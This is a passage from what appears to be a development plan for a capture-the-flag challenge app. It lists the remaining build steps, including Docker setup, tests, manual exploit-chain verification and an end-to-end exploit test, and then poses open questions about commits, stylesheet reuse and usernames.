8. Wire up the flag sync service (`src/services/flagSync.js`, `src/services/flagService.js`).
9. Write all EJS views and the stylesheet.
10. Write the Dockerfile and docker-compose.yml.
11. Write Jest tests (`test/app.test.js`).
12. Manually verify the full exploit chain end-to-end against a running Docker container.
13. Write README.md, SOLUTIONS.md, STORY.md, ctf-config.json.
14. Write the E2E exploit test (`CTFs/e2e/ctf7_exploit.py`).
15. Update the project CHANGELOG.md.

---

## 16. Questions to Resolve Before Starting

1. **Commit granularity:** One commit per major step, or one large commit at the end?
2. **Stylesheet:** Reuse CTF1's CSS with adjusted colours, or a distinct stylesheet?
3. **Usernames:** Use `abcd12`, `efgh34`, `ijkl56` (matching CTF1 convention) from a fresh generator run, or different usernames?
